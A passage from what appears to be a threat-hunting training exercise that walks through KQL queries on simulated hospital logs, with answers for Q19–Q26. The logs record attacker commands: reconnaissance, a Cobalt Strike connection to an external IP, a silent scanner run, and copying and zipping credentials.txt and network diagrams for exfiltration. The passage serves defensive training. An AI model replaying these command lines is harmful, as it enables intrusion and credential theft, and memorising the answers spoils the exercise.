| systeminfo          |

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">

#### **Q19: How many of these short discovery commands did the attackers run?**  


|timestamp|parent_process_name|parent_process_hash|process_commandline|process_name|process_hash|hostname|username|
|---|---|---|---|---|---|---|---|
|2024-05-02T15:45:54.000Z|cmd.exe|614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f|systeminfo|cmd.exe|b77341d06fd3330f726634b10424f9687987845daf3c99917ab9db3c401b3699|RQJQ-MACHINE|evbrowne|
|2024-05-02T16:23:54.000Z|cmd.exe|614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f|ipconfig /all|cmd.exe|c403e1741b79f1c4854b24e12cd96dc84c172a4340ab4c23f145d8047b4c2386|RQJQ-MACHINE|evbrowne|
|2024-05-02T16:46:54.000Z|cmd.exe|614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f|netstat -an|cmd.exe|b0c4c49de866f69929c954f736a8f84d0dd21e7fe110c7cfa23a84efabe61632|RQJQ-MACHINE|evbrowne|
|2024-05-02T16:59:54.000Z|cmd.exe|614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f|net user|cmd.exe|6671238022f297aea68378bf94c4b8bc35621335ba511bb57f507eb862486871|RQJQ-MACHINE|evbrowne|
|2024-05-03T10:05:50.000Z|cmd.exe|614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f|net localgroup administrators|cmd.exe|74a621fe8be438df479cbf0c93530d950dbdcd3b79f7020891676d38df342f94|RQJQ-MACHINE|evbrowne|
|2024-05-03T10:30:50.000Z|cmd.exe|614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f|net view|cmd.exe|48445d2e91a38160507cdac26d3b6d10a8be43234df156365ce52cc444263180|RQJQ-MACHINE|evbrowne|  


`6`
&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">

#### **Q20: What is Anthony Davis' hostname?**  


```
Employees
| where name == "Anthony Davis"
```

| hire_date                | name          | user_agent                                                       | ip_addr   | email_addr                      | company_domain    | username | role                    | hostname     |
| ------------------------ | ------------- | ---------------------------------------------------------------- | --------- | ------------------------------- | ----------------- | -------- | ----------------------- | ------------ |
| 2022-06-15T00:00:00.000Z | Anthony Davis | Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.1; Trident/6.0) | 10.10.0.1 | anthony_davis@jojoshospital.org | jojoshospital.org | andavis  | Senior IT Administrator | AMFB-MACHINE |  

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">

### **Questions 20-26**  

#### **Q21: When did the attackers connect to their IP address using cobalt strike on Anthony Davis' machine?**  


```
ProcessEvents
| where hostname == "AMFB-MACHINE"
| where process_commandline contains "cobalt"
```


|timestamp|parent_process_name|parent_process_hash|process_commandline|process_name|process_hash|hostname|username|
|---|---|---|---|---|---|---|---|
|2024-05-14T12:24:45.000Z|cmd.exe|614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f|C:\ProgramData\cobaltstrike.exe --connect 93.238.22.123:50050|cmd.exe|c167a329392a515e1cd2eead7f1481e2acbb02645f7dd036254450e66681cb7f|AMFB-MACHINE|andavis|  

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">

#### **Q22: What was the name of this scanning tool?**  

Once they got on Anthony Davis' machine, the hackers wanted to get a better understanding of the entire hospital network. So they downloaded an advanced scanning tool.  


```
ProcessEvents
| where hostname == "AMFB-MACHINE"
| where timestamp between (datetime(2024-05-13) .. datetime(2024-05-17))
```


|timestamp|parent_process_name|parent_process_hash|process_commandline|process_name|process_hash|hostname|username|
|---|---|---|---|---|---|---|---|
|2024-05-16T10:00:05.000Z|cmd.exe|614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f|C:\Users\andavis\Downloads\advanced-ip-scanner.exe /silent|advanced-ip-scanner.exe|1fe07fa09329574eb3d873c458a3625055d49b567e204992099430feee4b9086|AMFB-MACHINE|andavis|  

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">

#### **Q23: What was the name of the file the attackers exfiltrated to learn about the network? (hint: ___.pdf)**  

To better understand the hospital's network, the attackers took files that showed the network layout. These files contained important diagrams.


| process_commandline                                                                                              |
| ---------------------------------------------------------------------------------------------------------------- |
| cmd.exe /c copy C:\Users\andavis\Documents\network_diagrams.pdf \\jojos-hospital.org\backup\network_diagrams.pdf |

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">

#### **Q24: What was the name of the file the attackers took that would have contained usernames and passwords?**  


| process_commandline                                                                                    |
| ------------------------------------------------------------------------------------------------------ |
| cmd.exe /c copy C:\Users\andavis\Documents\credentials.txt \\jojos-hospital.org\backup\credentials.txt |

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">

#### **Q25: What was the name of this zip file?**   

Before stealing this file, the attackers first compressed them into a zip file. This allowed the files to be smaller so they would attract less attention. 


```
ProcessEvents
| where hostname == "AMFB-MACHINE"
| where process_commandline contains ".zip"
```


| process_commandline                                                                                                                                                                                           |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| cmd.exe /c powershell Compress-Archive -Path C:\Users\andavis\Documents\network_diagrams.pdf, C:\Users\andavis\Documents\credentials.txt -DestinationPath C:\Users\andavis\Desktop\important_network_info.zip |

&nbsp;

<hr style="height: 2px; background-color: #333; border: none;">

#### **Q26: Which domain did the attackers send the zip to?**  


`nothing-to-see-here.net`  


